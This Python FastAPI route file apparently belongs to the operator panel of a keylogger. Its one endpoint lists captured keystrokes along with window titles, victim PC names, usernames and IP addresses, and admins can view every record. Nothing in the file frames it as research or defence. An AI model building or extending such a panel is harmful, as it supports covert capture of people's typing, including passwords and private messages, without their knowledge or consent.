from typing import Any
from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log
import json

router = APIRouter()

@router.get("")
def get_keylogs(
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
) -> Any:
    """Return recent keylogger logs for current user (admin sees all)"""
    query = db.query(Log).filter(Log.log_type == 'keylog').order_by(Log.created_at.desc()).limit(500)
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)

    rows = query.all()
    result = []
    for r in rows:
        try:
            try:
                data = json.loads(r.content)
            except:
                data = { 'keys': r.content, 'window_title': 'Unknown' }
                
            result.append({
                'id': r.id,
                'player': r.pc_name or 'Unknown',
                'pc_name': r.pc_name,
                'pc_user': r.pc_user,
                'ip': r.ip_address,
                'window_title': data.get('window_title'),
                'keys': data.get('keys'),
                'created_at': r.created_at.isoformat() if r.created_at else None
            })
        except Exception as e:
            # Skip malformed logs to prevent invalidating the whole list
            print(f"Error parsing log {r.id}: {e}")
            continue

    return { 'success': True, 'keylogs': result, 'count': len(result) }
